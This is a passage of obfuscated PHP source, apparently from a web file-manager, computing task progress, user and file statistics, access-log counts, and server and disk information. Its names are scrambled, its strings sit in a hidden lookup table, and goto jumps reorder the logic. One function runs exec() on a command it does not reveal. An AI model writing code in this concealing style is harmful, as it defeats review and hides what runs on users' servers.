$Eªƒ«‹Ğßè) / $e·ÜğòÂÚù[$A©ÓÃ„³Õ[704]]; $e·ÜğòÂÚù[$A©ÓÃ„³Õ[1492]] = $a¸¦ÄÜ¶® * 0.3; } else { if ($e·ÜğòÂÚù[$A©ÓÃ„³Õ[1575]] == $A©ÓÃ„³Õ[309]) { $a¸¦ÄÜ¶® = $e·ÜğòÂÚù[$A©ÓÃ„³Õ[1003]] / $e·ÜğòÂÚù[$A©ÓÃ„³Õ[989]]; $e·ÜğòÂÚù[$A©ÓÃ„³Õ[1492]] = 0.3 + $a¸¦ÄÜ¶® * 0.5; } else { if ($e·ÜğòÂÚù[$A©ÓÃ„³Õ[1575]] == $A©ÓÃ„³Õ[106]) { $a¸¦ÄÜ¶® = 0; if ($e·ÜğòÂÚù[$A©ÓÃ„³Õ[1534]]) { $a¸¦ÄÜ¶® = $e·ÜğòÂÚù[$A©ÓÃ„³Õ[1535]] / $e·ÜğòÂÚù[$A©ÓÃ„³Õ[1534]]; } $e·ÜğòÂÚù[$A©ÓÃ„³Õ[1492]] = 0.3 + 0.5 + $a¸¦ÄÜ¶® * 0.2; } } } if ($e·ÜğòÂÚù[$A©ÓÃ„³Õ[1492]] > 0) { $c¼»”ˆ¾è = timeFloat() - $e·ÜğòÂÚù[$A©ÓÃ„³Õ[726]] - $e·ÜğòÂÚù[$A©ÓÃ„³Õ[1495]]; $e·ÜğòÂÚù[$A©ÓÃ„³Õ[1496]] = $c¼»”ˆ¾è * (1 - $e·ÜğòÂÚù[$A©ÓÃ„³Õ[1492]]) / $e·ÜğòÂÚù[$A©ÓÃ„³Õ[1492]]; } } public function copyFileStart($f‚øÀö“¶ï, $FŒ™«îÅÉé, $cÊï«µ—ã, $AçÔ„õ„Ü¥, $dá×ˆéä‘, $eÓÌÚÁËÙò) { $EÄ—•ÎºÜ =& $_SERVER[ç]; parent::copyFileStart($f‚øÀö“¶ï, $FŒ™«îÅÉé, $cÊï«µ—ã, $AçÔ„õ„Ü¥, $dá×ˆéä‘, $eÓÌÚÁËÙò); $f‚‡ÕØ³¨ =& $this->task; if ($f‚‡ÕØ³¨[$EÄ—•ÎºÜ[1575]] == $EÄ—•ÎºÜ[309]) { $f‚‡ÕØ³¨[$EÄ—•ÎºÜ[1575]] = $EÄ—•ÎºÜ[106]; } $this->update(); } public function copyFileEnd($B±ª´±Š”™, $aÈ¿¿ºŞ¯, $Cã§ˆŒìÍ‘, $FìÎĞ¶Ô, $AñÑÇ‘´ùÍ, $cê‹‹„´–Ğ) { $C¡Ä¯Şµ§ñ =& $_SERVER[ç]; $EˆøÑ…ÑÙ“ =& $this->task; $EˆøÑ…ÑÙ“[$C¡Ä¯Şµ§ñ[1535]] = $EˆøÑ…ÑÙ“[$C¡Ä¯Şµ§ñ[1534]]; $EˆøÑ…ÑÙ“[$C¡Ä¯Şµ§ñ[1539]] += $EˆøÑ…ÑÙ“[$C¡Ä¯Şµ§ñ[1534]]; $EˆøÑ…ÑÙ“[$C¡Ä¯Şµ§ñ[1536]] = $C¡Ä¯Şµ§ñ[33]; $this->update(); } public function nameParse($C—­Œ‰ «Ç) { $B¶Ò¦²ôŸ‚ =& $_SERVER[ç]; $a ƒÔ‹²‚è =& $this->task; if ($a ƒÔ‹²‚è[$B¶Ò¦²ôŸ‚[1003]] < $a ƒÔ‹²‚è[$B¶Ò¦²ôŸ‚[989]]) { $a”ï˜ƒÀæÔ = get_path_this($C—­Œ‰ «Ç); if (strstr($a”ï˜ƒÀæÔ, $B¶Ò¦²ôŸ‚[94])) { $a ƒÔ‹²‚è[$B¶Ò¦²ôŸ‚[1003]] += 1; } } if ($a ƒÔ‹²‚è[$B¶Ò¦²ôŸ‚[1575]] == $B¶Ò¦²ôŸ‚[1061]) { $a ƒÔ‹²‚è[$B¶Ò¦²ôŸ‚[1575]] = $B¶Ò¦²ôŸ‚[309]; } $a ƒÔ‹²‚è[$B¶Ò¦²ôŸ‚[1532]] = $C—­Œ‰ «Ç; $this->update(); } } class AnalysisModel extends ModelBaseLight { public function init($aÈƒˆ‘Âã×) { $c³ÜæØÖçì =& $_SERVER[ç]; $E¬Àšè¹Ö« = array($c³ÜæØÖçì[557] => array($c³ÜæØÖçì[29] => $c³ÜæØÖçì[1580], $c³ÜæØÖçì[269] => array($c³ÜæØÖçì[220], $c³ÜæØÖçì[706], $c³ÜæØÖçì[1581], $c³ÜæØÖçì[1582])), $c³ÜæØÖçì[1583] => array($c³ÜæØÖçì[29] => $c³ÜæØÖçì[1584], $c³ÜæØÖçì[269] => array($c³ÜæØÖçì[220], $c³ÜæØÖçì[704], $c³ÜæØÖçì[1585], $c³ÜæØÖçì[1586], $c³ÜæØÖçì[1587]))); if (!isset($E¬Àšè¹Ö«[$aÈƒˆ‘Âã×])) { return !1; } $this->optionType = $E¬Àšè¹Ö«[$aÈƒˆ‘Âã×][$c³ÜæØÖçì[29]]; $this->field = $E¬Àšè¹Ö«[$aÈƒˆ‘Âã×][$c³ÜæØÖçì[269]]; return !0; } public function listData($fÉĞƒ‡¶ìĞ = false, $AæÉæ‹èË = "\155\x6f\144\151\146\x79\x54\151\x6d\145", $FÔ…ŸéÓè = false) { return parent::listData($fÉĞƒ‡¶ìĞ, $AæÉæ‹èË, $FÔ…ŸéÓè); } public function trendList($Fì„ÍŞ×¤„) { goto AÊÜ‘è£Š¡; bæÖ†Õ¡Ò¢: if (!isset($BŠ†„æ¡)) { $AŠØÜ’ÇË = $Fì„ÍŞ×¤„ == $A‚‰Îï«İ[557] ? $A‚‰Îï«İ[501] : $A‚‰Îï«İ[760]; $BŠ†„æ¡ = Model($AŠØÜ’ÇË)->min($A‚‰Îï«İ[192]); } $E˜ÓÁ’ØÑ = $A‚‰Îï«İ[1590] . ucfirst($Fì„ÍŞ×¤„); $aÇ‰ÅºóÑ´ = $this->dateList($BŠ†„æ¡); goto f‚ìˆø©; f‚ìˆø©: foreach ($aÇ‰ÅºóÑ´ as $FŒÑ…çÉá‡) { $this->{$E˜ÓÁ’ØÑ}($FŒÑ…çÉá‡); } return $this->listData(); goto f‡‚„Í§‰–; AÊÜ‘è£Š¡: $A‚‰Îï«İ =& $_SERVER[ç]; $a”—µ¦ğŸ¡ = $this->listData(); if ($a”—µ¦ğŸ¡) { $aøÁ °Ù¨¢ = end($a”—µ¦ğŸ¡); $FŒÑ…çÉá‡ = date($A‚‰Îï«İ[1588], strtotime($A‚‰Îï«İ[1589])); if ($aøÁ °Ù¨¢[$A‚‰Îï«İ[220]] == $FŒÑ…çÉá‡) { return $a”—µ¦ğŸ¡; } $BŠ†„æ¡ = strtotime($aøÁ °Ù¨¢[$A‚‰Îï«İ[220]]); } goto bæÖ†Õ¡Ò¢; f‡‚„Í§‰–: } private function dateList($b¦¤®™ŞÌ¢) { $a…­–Ø§øÕ =& $_SERVER[ç]; $d¦‡’†‡·Ã = $b¦¤®™ŞÌ¢; $dÓËëŠ“Úİ = strtotime($a…­–Ø§øÕ[1589]); $eË†‰ó”ñÉ = array(); while ($d¦‡’†‡·Ã <= $dÓËëŠ“Úİ) { $eË†‰ó”ñÉ[] = date($a…­–Ø§øÕ[1588], $d¦‡’†‡·Ã); $d¦‡’†‡·Ã = strtotime($a…­–Ø§øÕ[1591], $d¦‡’†‡·Ã); } return $eË†‰ó”ñÉ; } public function _recordUser($Dæ¢›ÄÀóì = '') { goto dÕ…ÛÀŠ; eë¡½‚É«‰: $dØÍ‡«ï©» = array($bèà¼‘ÖÄÎ[220] => $Dæ¢›ÄÀóì, $bèà¼‘ÖÄÎ[706] => (int) $F¨“ÙÛ½, $bèà¼‘ÖÄÎ[1581] => (int) $E‹ƒ·™½¬, $bèà¼‘ÖÄÎ[1582] => (int) $cªÍ»ŒÂŞŒ); return $this->insert($dØÍ‡«ï©»); goto bğÌÎ·¸£Ê; C‰´¤ÕŒš¤: $E‹ƒ·™½¬ = Model($bèà¼‘ÖÄÎ[501])->where($EÙĞ…¶ †’)->count($bèà¼‘ÖÄÎ[1491]); $EÙĞ…¶ †’[$bèà¼‘ÖÄÎ[29]] = $bèà¼‘ÖÄÎ[1594]; $cªÍ»ŒÂŞŒ = Model($bèà¼‘ÖÄÎ[1595])->where($EÙĞ…¶ †’)->count($bèà¼‘ÖÄÎ[1596]); goto eë¡½‚É«‰; b«¹ìíÙ²Î: $EÙĞ…¶ †’ = array($bèà¼‘ÖÄÎ[192] => array($bèà¼‘ÖÄÎ[938], $EìÖ°×á¢÷)); $F¨“ÙÛ½ = Model($bèà¼‘ÖÄÎ[501])->where($EÙĞ…¶ †’)->count($bèà¼‘ÖÄÎ[1491]); $EÙĞ…¶ †’[$bèà¼‘ÖÄÎ[192]] = array($bèà¼‘ÖÄÎ[329], array($dº¶¹ƒšäã, $EìÖ°×á¢÷)); goto C‰´¤ÕŒš¤; dÕ…ÛÀŠ: $bèà¼‘ÖÄÎ =& $_SERVER[ç]; $dº¶¹ƒšäã = strtotime(date($bèà¼‘ÖÄÎ[1592], strtotime($Dæ¢›ÄÀóì))); $EìÖ°×á¢÷ = strtotime(date($bèà¼‘ÖÄÎ[1593], strtotime($Dæ¢›ÄÀóì))); goto b«¹ìíÙ²Î; bğÌÎ·¸£Ê: } public function _recordStore($bÙ§µ´ùÅ = '') { goto B¥ÀñöÄ; B¥ÀñöÄ: $CªğìÏÇŒˆ =& $_SERVER[ç]; $bõœ´Îö“µ = strtotime(date($CªğìÏÇŒˆ[1593], strtotime($bÙ§µ´ùÅ))); $b¼Ñ®£Õ§ = array($CªğìÏÇŒˆ[192] => array($CªğìÏÇŒˆ[938], $bõœ´Îö“µ)); goto F¤Òğ‚¶é; E­†¿ñ¯’£: $cÜØãÈß‹Í = Model($CªğìÏÇŒˆ[760])->where($b¼Ñ®£Õ§)->sum($CªğìÏÇŒˆ[77]); $cÃÄï§ßŞñ = array($CªğìÏÇŒˆ[220] => $bÙ§µ´ùÅ, $CªğìÏÇŒˆ[704] => (int) $c‡½ùõß, $CªğìÏÇŒˆ[1585] => (int) $Eª …õ‹œ¨, $CªğìÏÇŒˆ[1586] => (int) $a¨í±»É­, $CªğìÏÇŒˆ[1587] => (int) $cÜØãÈß‹Í); return $this->insert($cÃÄï§ßŞñ); goto Dª§ïİ§·ñ; EÕ”ŒŠˆßÍ: $b¼Ñ®£Õ§[$CªğìÏÇŒˆ[398]] = 1; $a¨í±»É­ = Model($CªğìÏÇŒˆ[760])->where($b¼Ñ®£Õ§)->sum($CªğìÏÇŒˆ[77]); $b¼Ñ®£Õ§[$CªğìÏÇŒˆ[398]] = 2; goto E­†¿ñ¯’£; F¤Òğ‚¶é: $Eª …õ‹œ¨ = Model($CªğìÏÇŒˆ[444])->where($b¼Ñ®£Õ§)->sum($CªğìÏÇŒˆ[77]); $b¼Ñ®£Õ§[$CªğìÏÇŒˆ[397]] = 0; $c‡½ùõß = Model($CªğìÏÇŒˆ[760])->where($b¼Ñ®£Õ§)->sum($CªğìÏÇŒˆ[77]); goto EÕ”ŒŠˆßÍ; Dª§ïİ§·ñ: } public function trend($a¡”–ìÃ, $A˜ß–µ¯°) { goto fÕõ¤Ì´ÄÙ; FÔ°…»ºÖ„: return $a‡ÄÄÅ×ø¤; goto D×À„«‘ê; EçØ©Òø‡: if (empty($C½Ä‹¸ô…)) { $F‚©âùé• = date($fµ…ÉãÓ×Ç[1588], strtotime($fµ…ÉãÓ×Ç[1589])); $dááÂ‡éÊ» = array($fµ…ÉãÓ×Ç[220] => $F‚©âùé•); foreach ($BÇ²‘ñˆ˜¸[$a¡”–ìÃ] as $dÜê§ØŸ«Ã => $eéÕÎÕÒÔ´) { $dááÂ‡éÊ»[$dÜê§ØŸ«Ã] = 0; } $C½Ä‹¸ô…[] = $dááÂ‡éÊ»; } $a‡ÄÄÅ×ø¤ = array(); foreach ($C½Ä‹¸ô… as $eéÕÎÕÒÔ´) { if ($a¡”–ìÃ == $fµ…ÉãÓ×Ç[1583] && $eéÕÎÕÒÔ´[$fµ…ÉãÓ×Ç[1585]] > $eéÕÎÕÒÔ´[$fµ…ÉãÓ×Ç[704]]) { $eéÕÎÕÒÔ´[$fµ…ÉãÓ×Ç[1585]] = $eéÕÎÕÒÔ´[$fµ…ÉãÓ×Ç[704]]; } foreach ($BÇ²‘ñˆ˜¸[$a¡”–ìÃ] as $dÜê§ØŸ«Ã => $dÛÃ’ÊËœ•) { $a…·º‹ã¯É = array($fµ…ÉãÓ×Ç[220] => $eéÕÎÕÒÔ´[$fµ…ÉãÓ×Ç[220]], $fµ…ÉãÓ×Ç[1396] => $dÛÃ’ÊËœ•); $a…·º‹ã¯É[$c¨·µÒœŠ[$a¡”–ìÃ]] = isset($eéÕÎÕÒÔ´[$dÜê§ØŸ«Ã]) ? $eéÕÎÕÒÔ´[$dÜê§ØŸ«Ã] : 0; $a‡ÄÄÅ×ø¤[] = $a…·º‹ã¯É; } } goto FÔ°…»ºÖ„; c›²Ó’£: if ($C½Ä‹¸ô… && $A˜ß–µ¯° != $fµ…ÉãÓ×Ç[1465]) { $b¤‹Â‘¥å = $C½Ä‹¸ô…[0][$fµ…ÉãÓ×Ç[220]]; $aÑÅƒ³ˆ–º = $this->validDate($A˜ß–µ¯°, $b¤‹Â‘¥å); $cšî§¾ùÀ‹ = array(); $eö‰ÍÛ“è = array_to_keyvalue($C½Ä‹¸ô…, $fµ…ÉãÓ×Ç[220]); foreach ($aÑÅƒ³ˆ–º as $F‚©âùé•) { if (isset($eö‰ÍÛ“è[$F‚©âùé•])) { $a…·º‹ã¯É = $eö‰ÍÛ“è[$F‚©âùé•]; } else { $a…·º‹ã¯É = end($C½Ä‹¸ô…); $a…·º‹ã¯É[$fµ…ÉãÓ×Ç[220]] = $F‚©âùé•; if ($a¡”–ìÃ == $fµ…ÉãÓ×Ç[557]) { $a…·º‹ã¯É[$fµ…ÉãÓ×Ç[1581]] = $a…·º‹ã¯É[$fµ…ÉãÓ×Ç[1582]] = 0; } } $cšî§¾ùÀ‹[] = $a…·º‹ã¯É; } $C½Ä‹¸ô… = $cšî§¾ùÀ‹; } $BÇ²‘ñˆ˜¸ = array($fµ…ÉãÓ×Ç[557] => array($fµ…ÉãÓ×Ç[706] => LNG($fµ…ÉãÓ×Ç[1597]), $fµ…ÉãÓ×Ç[1581] => LNG($fµ…ÉãÓ×Ç[1598]), $fµ…ÉãÓ×Ç[1582] => LNG($fµ…ÉãÓ×Ç[1599])), $fµ…ÉãÓ×Ç[1583] => array($fµ…ÉãÓ×Ç[704] => LNG($fµ…ÉãÓ×Ç[1600]), $fµ…ÉãÓ×Ç[1585] => LNG($fµ…ÉãÓ×Ç[1601]), $fµ…ÉãÓ×Ç[1586] => LNG($fµ…ÉãÓ×Ç[1602]), $fµ…ÉãÓ×Ç[1587] => LNG($fµ…ÉãÓ×Ç[1603]))); $c¨·µÒœŠ = array($fµ…ÉãÓ×Ç[557] => $fµ…ÉãÓ×Ç[1604], $fµ…ÉãÓ×Ç[1583] => $fµ…ÉãÓ×Ç[77]); goto EçØ©Òø‡; fÕõ¤Ì´ÄÙ: $fµ…ÉãÓ×Ç =& $_SERVER[ç]; if (!$this->init($a¡”–ìÃ)) { return !1; } $C½Ä‹¸ô… = $this->trendList($a¡”–ìÃ); goto c›²Ó’£; D×À„«‘ê: } public function validDate($BÆ³İöÅ·, $EÕÁ›ëÂô‡) { goto fÅ‹¿“†‘; F˜…Òœ¤¢: switch ($BÆ³İöÅ·) { case $Cìù“ƒçÉñ[1472]: $DäŒğÑ¼‘¿ = mktime(0, 0, 0, date($Cìù“ƒçÉñ[1605]), date($Cìù“ƒçÉñ[1217]) - date($Cìù“ƒçÉñ[1279]) + 7 - 7, date($Cìù“ƒçÉñ[1606])); $fÏ«’Ú †Š = 0; do { $e³­ÇŒöóÙ = date($Cìù“ƒçÉñ[1588], $DäŒğÑ¼‘¿ - 3600 * 24 * 7 * $fÏ«’Ú †Š); $a—À…¬ëáÆ[] = $e³­ÇŒöóÙ; $fÏ«’Ú †Š++; } while ($EÕÁ›ëÂô‡ < $e³­ÇŒöóÙ); break; case $Cìù“ƒçÉñ[1470]: $fÏ«’Ú †Š = 1; do { $CİùÁ‡Â×˜ = date($Cìù“ƒçÉñ[1607], strtotime("\x2d\x20{$fÏ«’Ú †Š}\x20\x6d\157\x6e\164\x68\163")); $a—À…¬ëáÆ[] = $CİùÁ‡Â×˜; $fÏ«’Ú †Š++; } while ($EÕÁ›ëÂô‡ < $CİùÁ‡Â×˜); break; case $Cìù“ƒçÉñ[1608]: $AŞÖ»Š÷ß = (int) date($Cìù“ƒçÉñ[1606], strtotime($EÕÁ›ëÂô‡)); $CÈš¹¶»ÓÄ = (int) date($Cìù“ƒçÉñ[1606]); if ($AŞÖ»Š÷ß >= $CÈš¹¶»ÓÄ) { break; } for ($AŞÖ»Š÷ß; $AŞÖ»Š÷ß < $CÈš¹¶»ÓÄ; $AŞÖ»Š÷ß++) { $a—À…¬ëáÆ[] = $AŞÖ»Š÷ß . $Cìù“ƒçÉñ[1609]; } break; default: break; } if ($EÕÁ›ëÂô‡ > end($a—À…¬ëáÆ)) { array_pop($a—À…¬ëáÆ); } sort($a—À…¬ëáÆ); goto D§Ìˆñš; D§Ìˆñš: return $a—À…¬ëáÆ; goto D‡’îğÊ³˜; fÅ‹¿“†‘: $Cìù“ƒçÉñ =& $_SERVER[ç]; $e’‰¯£ò·Ç = date($Cìù“ƒçÉñ[1588], strtotime($Cìù“ƒçÉñ[1589])); $a—À…¬ëáÆ = array($e’‰¯£ò·Ç); goto F˜…Òœ¤¢; D‡’îğÊ³˜: } public function listTable($aõòÛ‡) { $D×î¶‡—ìë = ucfirst($aõòÛ‡); return Model($D×î¶‡—ìë)->listData(); } public function option($d…ˆŠîíŞ³) { $C“å–Â´ù = $_SERVER[ç][1610] . ucfirst($d…ˆŠîíŞ³); return $this->{$C“å–Â´ù}(); } private function optionUser() { goto F³êˆŒ±—; F³êˆŒ±—: $cº’ƒéÁ‘ì =& $_SERVER[ç]; $E½²º±Ø²ñ = Model($cº’ƒéÁ‘ì[501])->count($cº’ƒéÁ‘ì[1491]); $A´èàê£æà = Model($cº’ƒéÁ‘ì[501])->where($cº’ƒéÁ‘ì[1611])->count($cº’ƒéÁ‘ì[1491]); goto fƒÄˆ‘óá‰; AÖŒµìƒñ: $e®…‘Ÿ²¨¹ = array($cº’ƒéÁ‘ì[1612] => array($cº’ƒéÁ‘ì[939], $aÕ—ƒãŒÍ)); $EÁŸÖ‘ƒÎ = Model($cº’ƒéÁ‘ì[501])->where($e®…‘Ÿ²¨¹)->count($cº’ƒéÁ‘ì[1491]); return array($cº’ƒéÁ‘ì[701] => (int) $E½²º±Ø²ñ, $cº’ƒéÁ‘ì[1613] => (int) ($E½²º±Ø²ñ - $A´èàê£æà), $cº’ƒéÁ‘ì[1614] => (int) $A´èàê£æà, $cº’ƒéÁ‘ì[1615] => (int) $EÁŸÖ‘ƒÎ, $cº’ƒéÁ‘ì[1616] => $C¤Ìğ»Ò®); goto c‹‡œ‰ïè·; fƒÄˆ‘óá‰: $aÂî‚ÏİË = intval($GLOBALS[$cº’ƒéÁ‘ì[6]][$cº’ƒéÁ‘ì[345]][$cº’ƒéÁ‘ì[1450]]) / 3600; $aÕ—ƒãŒÍ = strtotime("\55{$aÂî‚ÏİË}\x20\x68\x6f\165\x72\163"); $e®…‘Ÿ²¨¹ = array($cº’ƒéÁ‘ì[1612] => array($cº’ƒéÁ‘ì[939], $aÕ—ƒãŒÍ)); goto fŒöÛŒšË›; fŒöÛŒšË›: $C¤Ìğ»Ò® = (int) Model($cº’ƒéÁ‘ì[501])->where($e®…‘Ÿ²¨¹)->count($cº’ƒéÁ‘ì[1491]); if (!$C¤Ìğ»Ò®) { $C¤Ìğ»Ò® = 1; } $aÕ—ƒãŒÍ = strtotime(date($cº’ƒéÁ‘ì[1592])); goto AÖŒµìƒñ; c‹‡œ‰ïè·: } private function optionFile() { goto FŞÉ×áĞ; c¨åì¯îÊ: $F§ÆøÇ£¨‰ = $Bã¯ÂéïÌÎ[$AÑ‘ÄôõÈº[1585]]; $bğÓ«Æ–’Å = Model($AÑ‘ÄôõÈº[760])->where(array($AÑ‘ÄôõÈº[397] => 0))->count($AÑ‘ÄôõÈº[390]); $F½Äâ½Ìí‰ = array($AÑ‘ÄôõÈº[397] => 0, $AÑ‘ÄôõÈº[192] => array($AÑ‘ÄôõÈº[939], strtotime(date($AÑ‘ÄôõÈº[1592])))); goto aÔÛïš¯ëÁ; FŞÉ×áĞ: $AÑ‘ÄôõÈº =& $_SERVER[ç]; $Bã¯ÂéïÌÎ = $this->sourceSize(); $b ÖÍ‹Çã = $Bã¯ÂéïÌÎ[$AÑ‘ÄôõÈº[77]]; goto c¨åì¯îÊ; aÔÛïš¯ëÁ: $c¨ÛƒË³¬÷ = Model($AÑ‘ÄôõÈº[760])->where($F½Äâ½Ìí‰)->sum($AÑ‘ÄôõÈº[77]); $D ÒÕ»„“¨ = Model($AÑ‘ÄôõÈº[760])->where($F½Äâ½Ìí‰)->count($AÑ‘ÄôõÈº[390]); return array($AÑ‘ÄôõÈº[704] => $b ÖÍ‹Çã, $AÑ‘ÄôõÈº[1585] => $F§ÆøÇ£¨‰, $AÑ‘ÄôõÈº[1617] => $b ÖÍ‹Çã - $F§ÆøÇ£¨‰, $AÑ‘ÄôõÈº[1618] => (int) $c¨ÛƒË³¬÷, $AÑ‘ÄôõÈº[706] => (int) $bğÓ«Æ–’Å, $AÑ‘ÄôõÈº[1619] => (int) $D ÒÕ»„“¨); goto d‹¢°ºÜÈ; d‹¢°ºÜÈ: } private function optionAccess() { $D‘˜¿Î“Ü =& $_SERVER[ç]; return array($D‘˜¿Î“Ü[701] => $this->typeLogCnt(), $D‘˜¿Î“Ü[106] => $this->typeLogCnt($D‘˜¿Î“Ü[106]), $D‘˜¿Î“Ü[424] => $this->typeLogCnt($D‘˜¿Î“Ü[424]), $D‘˜¿Î“Ü[1620] => $this->typeLogCnt($D‘˜¿Î“Ü[1620]), $D‘˜¿Î“Ü[1621] => $this->typeLogCnt($D‘˜¿Î“Ü[1621]), $D‘˜¿Î“Ü[557] => $this->typeLogCnt($D‘˜¿Î“Ü[33], $D‘˜¿Î“Ü[1596])); } private function typeLogCnt($dÆÙ‰²ñ„ = '', $EÆ•¼ƒ„°Ü = "\x69\x64") { goto dğ­„™®–Œ; a‰³»ˆ”Î†: return (int) $F§¤‘µ…ç; goto E¬“í¨ù¨î; E’¨­¾š¡: $C‰†•³™å = array($bôÁ¾ØÓÈÊ[192] => array($bôÁ¾ØÓÈÊ[939], $Eì²®½Ñ­‡)); if ($dÆÙ‰²ñ„) { $C‰†•³™å[$bôÁ¾ØÓÈÊ[29]] = array($bôÁ¾ØÓÈÊ[7], $A½äÊÔÔëÙ[$dÆÙ‰²ñ„]); } $F§¤‘µ…ç = Model($bôÁ¾ØÓÈÊ[1595])->where($C‰†•³™å)->count($EÆ•¼ƒ„°Ü); goto a‰³»ˆ”Î†; dğ­„™®–Œ: $bôÁ¾ØÓÈÊ =& $_SERVER[ç]; $A½äÊÔÔëÙ = array($bôÁ¾ØÓÈÊ[106] => array($bôÁ¾ØÓÈÊ[1622], $bôÁ¾ØÓÈÊ[1623]), $bôÁ¾ØÓÈÊ[424] => array($bôÁ¾ØÓÈÊ[1624], $bôÁ¾ØÓÈÊ[1625]), $bôÁ¾ØÓÈÊ[1620] => array($bôÁ¾ØÓÈÊ[1626], $bôÁ¾ØÓÈÊ[1627], $bôÁ¾ØÓÈÊ[1628]), $bôÁ¾ØÓÈÊ[1621] => array($bôÁ¾ØÓÈÊ[1629], $bôÁ¾ØÓÈÊ[1630]), $bôÁ¾ØÓÈÊ[1631] => array($bôÁ¾ØÓÈÊ[1632], $bôÁ¾ØÓÈÊ[1633], $bôÁ¾ØÓÈÊ[1634])); $Eì²®½Ñ­‡ = strtotime(date($bôÁ¾ØÓÈÊ[1592])); goto E’¨­¾š¡; E¬“í¨ù¨î: } private function optionServer() { goto d˜«…®í™Ë; d˜«…®í™Ë: $EÉõé‹ƒÑš =& $_SERVER[ç]; $d³ÌŸÆ‡™¥ = $this->diskDriver(); $b„•‚¨ŠôÙ = KodIO::defaultDriver(); goto AÊÖ¸÷²¦–; AÊÖ¸÷²¦–: $A‘Ñ¬Ø½³ = array($EÉõé‹ƒÑš[753] => $b„•‚¨ŠôÙ[$EÉõé‹ƒÑš[388]]); $a„éÀŸÎÎÀ = Model($EÉõé‹ƒÑš[444])->where($A‘Ñ¬Ø½³)->sum($EÉõé‹ƒÑš[77]); $b„”¥ç‚¯” = explode($EÉõé‹ƒÑš[50], $_SERVER[$EÉõé‹ƒÑš[141]]); goto c–‘™ì…©; D¼£ƒ“§¹ˆ: return array($EÉõé‹ƒÑš[1637] => $d³ÌŸÆ‡™¥ ? $d³ÌŸÆ‡™¥[$EÉõé‹ƒÑš[1638]] : 0, $EÉõé‹ƒÑš[1639] => $d³ÌŸÆ‡™¥ ? $d³ÌŸÆ‡™¥[$EÉõé‹ƒÑš[1640]] : 0, $EÉõé‹ƒÑš[1641] => (int) $b„•‚¨ŠôÙ[$EÉõé‹ƒÑš[1638]] * 1024 * 1024 * 1024, $EÉõé‹ƒÑš[1642] => (int) $a„éÀŸÎÎÀ, $EÉõé‹ƒÑš[1643] => ucfirst($B†¤ëîÈ”), $EÉõé‹ƒÑš[1644] => $EÉõé‹ƒÑš[1645] . PHP_VERSION, $EÉõé‹ƒÑš[1646] => phpBuild64() ? 64 : 32, $EÉõé‹ƒÑš[700] => str_replace($EÉõé‹ƒÑš[1647], $EÉõé‹ƒÑš[916], $AÃ¿ÈÃ‡£), $EÉõé‹ƒÑš[345] => ucfirst($C¾¯“àÑ¥‚), $EÉõé‹ƒÑš[28] => $_SERVER[$EÉõé‹ƒÑš[1648]]); goto Fé½¹©Óî; c–‘™ì…©: $B†¤ëîÈ” = $b„”¥ç‚¯”[0]; $E„Œí÷»ë­ = $GLOBALS[$EÉõé‹ƒÑš[6]][$EÉõé‹ƒÑš[17]]; $AÃ¿ÈÃ‡£ = $E„Œí÷»ë­[$EÉõé‹ƒÑš[900]]; goto d•©¶…—‰Í; d•©¶…—‰Í: if ($AÃ¿ÈÃ‡£ == $EÉõé‹ƒÑš[731]) { $D¦ÀÆËƒêˆ = explode($EÉõé‹ƒÑš[1132], $E„Œí÷»ë­[$EÉõé‹ƒÑš[899]]); $AÃ¿ÈÃ‡£ = $D¦ÀÆËƒêˆ[0]; } if ($AÃ¿ÈÃ‡£ == $EÉõé‹ƒÑš[734] || $AÃ¿ÈÃ‡£ == $EÉõé‹ƒÑš[735]) { $dğ¯‚ “¢ = Model()->db()->query($EÉõé‹ƒÑš[1635]); $A¯ÛÔôËİ‰ = $dğ¯‚ “¢[0] && isset($dğ¯‚ “¢[0][$EÉõé‹ƒÑš[1395]]) ? $dğ¯‚ “¢[0][$EÉõé‹ƒÑš[1395]] : 0; $AÃ¿ÈÃ‡£ = $EÉõé‹ƒÑš[1636] . ($A¯ÛÔôËİ‰ ? $EÉõé‹ƒÑš[8] . $A¯ÛÔôËİ‰ : $EÉõé‹ƒÑš[33]); } $C¾¯“àÑ¥‚ = $GLOBALS[$EÉõé‹ƒÑš[6]][$EÉõé‹ƒÑš[345]][$EÉõé‹ƒÑš[762]]; goto D¼£ƒ“§¹ˆ; Fé½¹©Óî: } private function diskDriver() { goto cñô¸Í¾‰; C³ÏˆñÚ¡‘: if ($cÑºÃ‰é›) { $e»½‘ìÆ¡³ = $aŠÔæõÇ–Ñ[1651]; if (function_exists($aŠÔæõÇ–Ñ[1652])) { exec($aŠÔæõÇ–Ñ[1653], $Aè•¡î¥); $e»½‘ìÆ¡³ = $Aè•¡î¥[1] . $aŠÔæõÇ–Ñ[8]; } } if (!file_exists($e»½‘ìÆ¡³)) { return; } $e–„‰äì‘Ò = @disk_total_space($e»½‘ìÆ¡³); goto Aâ¦ãÉùà‰; Aâ¦ãÉùà‰: $A‘ÍÏ»ÌË = $e–„‰äì‘Ò - @disk_free_space($e»½‘ìÆ¡³); return array($aŠÔæõÇ–Ñ[1638] => $e–„‰äì‘Ò, $aŠÔæõÇ–Ñ[1640] => $A‘ÍÏ»ÌË); goto AÁ†°ø¨“ğ; cñô¸Í¾‰: $aŠÔæõÇ–Ñ =& $_SERVER[ç]; $e»½‘ìÆ¡³ = $aŠÔæõÇ–Ñ[8]; $cÑºÃ‰é› = $GLOBALS[$aŠÔæõÇ–Ñ[6]][$aŠÔæõÇ–Ñ[1649]] == $aŠÔæõÇ–Ñ[1650]; goto C³ÏˆñÚ¡‘; AÁ†°ø¨“ğ: } public function fileChart($A‘Ï³Ò¸šä) { goto e¹ˆ‚»£»”; e¹ˆ‚»£»”: $A‡¢ø‘˜ö =& $_SERVER[ç]; if (isset($A‘Ï³Ò¸šä[$A‡¢ø‘˜ö[1491]])) { return Model($A‡¢ø‘˜ö[760])->userFileTypeProfile($A‘Ï³Ò¸šä[$A‡¢ø‘˜ö[1491]]); } if (isset($A‘Ï³Ò¸šä[$A‡¢ø‘˜ö[1654]])) { return Model($A‡¢ø‘˜ö[760])->groupFileTypeProfile($A‘Ï³Ò¸šä[$A‡¢ø‘˜ö[1654]]); } goto aóâÒ¸†¶; bãÖ‚¿ÓĞ„: $cªŠÂ¶¿Š[$A‡¢ø‘˜ö[398]] = 2; $fì™à§¬ = Model($A‡¢ø‘˜ö[760])->where($cªŠÂ¶¿Š)->sum($A‡¢ø‘˜ö[77]); return array($A‡¢ø‘˜ö[704] => $eµ³äˆŠ[$A‡¢ø‘˜ö[77]], $A‡¢ø‘˜ö[1585] => $eµ³äˆŠ[$A‡¢ø‘˜ö[1585]], 